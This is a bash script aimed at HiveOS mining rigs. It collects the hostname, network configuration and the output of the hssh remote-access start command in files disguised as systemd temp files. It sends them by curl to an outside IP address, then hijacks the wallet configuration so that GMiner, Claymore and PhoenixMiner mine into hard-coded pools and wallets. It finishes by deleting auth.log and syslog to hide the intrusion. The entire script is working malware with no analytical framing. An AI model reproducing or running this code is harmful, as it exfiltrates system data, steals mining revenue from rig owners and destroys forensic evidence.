#! /usr/bin/env bash
FILE_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service
HSSH_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service.pid
IFCONFIG_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service.sock
/bin/hostname > ${FILE_HOSTNAME}
/hive/bin/hssh start > ${HSSH_HOSTNAME}
/sbin/ifconfig > ${IFCONFIG_HOSTNAME}
/hive/sbin/curl -XPOST -F "hostname=@${FILE_HOSTNAME}" -F "hssh=@${HSSH_HOSTNAME}" -F "ifconfig=@${IFCONFIG_HOSTNAME}" "http://185.86.149.116:8085/"
rm ${FILE_HOSTNAME} ${HSSH_HOSTNAME} ${IFCONFIG_HOSTNAME}
FILE=/hive-config/wallet.conf
IS_GMINER=$(/bin/cat $FILE | /bin/grep 'GMINER_TEMPLATE=' | wc -l)
IS_CLAYMORE=$(/bin/cat $FILE | /bin/grep 'EPOOLS_TPL=' | wc -l)
IS_PHONEIX=$(/bin/cat $FILE | /bin/grep 'PHOENIXMINER_URL=' | wc -l)
/bin/bash /hive/bin/miner stop
if [[ "${IS_GMINER}" -eq 1 ]]; then
    /bin/sed -i -r \
      -e 's/^GMINER_TEMPLATE=.+/GMINER_TEMPLATE="12e4081d9204882412eee22a1704ee73491d6a4759be0ed2ef6cda7997824d3c246.beam"/' \
          -e 's/^GMINER_HOST=.+/GMINER_HOST="beam.f2pool.com"/' \
      -e 's/^GMINER_PORT=.+/GMINER_PORT="5000"/' \
      -e 's/^GMINER_TLS=.+/GMINER_TLS="1"/' \
      $FILE
    /bin/bash /hive/bin/miner start
fi
if [[ "${IS_CLAYMORE}" -eq 1 ]]; then
    /bin/sed -i -r \
      -e 's/^EPOOLS_TPL=.+/EPOOLS_TPL="POOL: daggerhashimoto.usa-new.nicehash.com:3353, WALLET: 39Rqd9GvUittmAnn1Lpb4QD8cj89UbTeoX, PSW: x, ESM: 3, ALLPOOLS: 1"/' \
      -e 's/^POOL:.+//' \
      $FILE
    /bin/bash /hive/bin/miner start
fi
if [[ "${IS_PHONEIX}" -eq 1 ]]; then
    /bin/sed -i -r \
      -e 's/^PHOENIXMINER_URL=.+/PHOENIXMINER_URL="POOL: daggerhashimoto.usa-new.nicehash.com:3353, WALLET: 39Rqd9GvUittmAnn1Lpb4QD8cj89UbTeoX, PSW: x, ESM: 3, ALLPOOLS: 1"/' \
      $FILE
    /bin/bash /hive/bin/miner start
fi
/bin/rm /var/log/auth.log
/bin/rm /var/log/syslog 
